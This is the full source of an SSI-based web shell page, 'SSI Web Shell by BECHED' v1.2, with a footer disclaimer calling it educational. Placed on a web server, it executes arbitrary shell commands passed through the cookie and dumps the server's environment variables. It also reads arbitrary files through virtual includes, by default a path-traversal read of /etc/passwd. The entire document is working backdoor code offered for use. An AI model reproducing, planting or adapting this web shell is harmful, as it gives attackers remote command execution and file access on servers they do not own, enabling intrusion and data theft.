<!--#config errmsg="[Error in shell]" sizefmt="bytes" timefmt="%d/%m/%Y, %H:%M:%S" -->
<!--#if expr="(\"$HTTP_COOKIE\" = \"\") || (\"$REQUEST_METHOD\" != \"GET\")" -->
	<!--#set var="shl" value="ls -al" -->
<!--#else -->
	<!--#set var="shl" value=$HTTP_COOKIE -->
<!--#endif -->
<!--#if expr="(\"$HTTP_COOKIE\" = \"\") || (\"$REQUEST_METHOD\" != \"POST\")" -->
	<!--#set var="inc" value="/../../../../../../../etc/passwd" -->
<!--#else -->
	<!--#set var="inc" value=$HTTP_COOKIE -->
<!--#endif -->
<html>
<head>
<title>
SSI Web Shell by BECHED
</title>
<script language="javascript">
function doit( mode ) {
	if( document.cookie != "" ) {
		var cookies = document.cookie.split( ";" );
		for( var i = 0; i < cookies.length; ++i ) 
			document.cookie = cookies[ i ] + ";expires=Thu, 01 Jan 1970 00:00:00 GMT";
	}
	document.cookie = document.getElementById( mode ).value;
	document.location.reload();
}
function toggle( id ) {
	document.getElementById( id ).style.display = (document.getElementById( id ).style.display == "none") ? "block" : "none";
}
</script>
</head>
<body bgcolor=#e4e0d8 alink=blue vlink=blue>
<div align=center width=100% border=0 style=background-color:#D4D0C8;>
<center><b><font size=+2><a href=http://ahack.ru/releases/ssi-web-shell.htm>SSI Web Shell</a></font></b></center>
</div><br>
<div align=left width=100% border=0 style=background-color:#D4D0C8;>
<center><b><u><font size=+1 onclick=toggle('inf'); style=cursor:hand;>Common info</font></u></b></center>
<div id=inf style=display:none;><br>
<b><font color=blue>GMT date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_GMT --></b><br>
<b><font color=blue>Local date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_LOCAL --></b><br>
<b><font color=blue>Document name</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_NAME --></b><br>
<b><font color=blue>Document URI</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_URI --></b><br>
<b><font color=blue>Last modified</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=LAST_MODIFIED --></b><br>
<b><font color=blue>Owner</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=USER_NAME --></b><br>
<br></div>
</div>
<br>
<div align=left width=100% border=0 style=background-color:#D4D0C8;>
<center><b><u><font size=+1 onclick=toggle('env'); style=cursor:hand;>Enviroment info</font></u></b></center>
<div id=env style=display:none;><br>
<pre>
<!--#printenv-->
</pre>
<br></div>
</div>
<br>
<div align=left width=100% border=0 style=background-color:#D4D0C8;>
<center><b><u><font size=+1 onclick=toggle('shl'); style=cursor:hand;>Command for shell</font></u></b></center></div>
<br><div align=left width=100% border=0 id=shl style=background-color:#D4D0C8;<!--#if expr="\"$REQUEST_METHOD\" != \"GET\"" -->display:none;<!--#endif -->>
<b><font color=blue>Enter command</font></b>:&nbsp;&nbsp;&nbsp;<form method=get onsubmit=doit('command');><input type=text size=80 id=command>&nbsp;<input type=submit value=Run></form><br>
<center><b><font size=+1>Result</font></b></center>
<br>
<b><font color=blue>Executed command</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=shl --></b><br>
<textarea bgcolor=#e4e0d8 cols=121 rows=15>
<!--#exec cmd=$shl -->
</textarea>
</div><br>
<div align=left width=100% border=0 style=background-color:#D4D0C8;>
<center><b><u><font size=+1 onclick=toggle('inc'); style=cursor:hand;>Operations on files</font></u></b></center>
<div id=inc <!--#if expr="\"$REQUEST_METHOD\" != \"POST\"" -->style=display:none;<!--#endif -->><br>
<b><font color=blue>View file (virtual include)</font></b>:&nbsp;&nbsp;&nbsp;<form method=post onsubmit=doit('vfile');><input type=text size=80 id=vfile>&nbsp;<input type=submit value=Run></form><br>
<b><font color=blue>Included file</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=inc --></b><br>
<b><font color=blue>Size</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#fsize virtual=$inc -->&nbsp;bytes</b><br>
<b><font color=blue>File modified at</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#flastmod virtual=$inc --></b><br>
<textarea bgcolor=#e4e0d8 cols=121 rows=15>
<!--#include virtual=$inc -->
</textarea>
<br></div>
</div>
<br>
<div align=center width=100% border=0 style=background-color:#D4D0C8;>
<center><b><font size=+1><a href=http://ahack.ru>(c) BECHED</a></font></b><br><small>2009-2011, v1.2</small><br>
ONLY FOR EDUCATIONAL PURPOSES. ILLEGAL ACTIVITIES PROHIBITED.
</center>
</div>
</body>
</html>
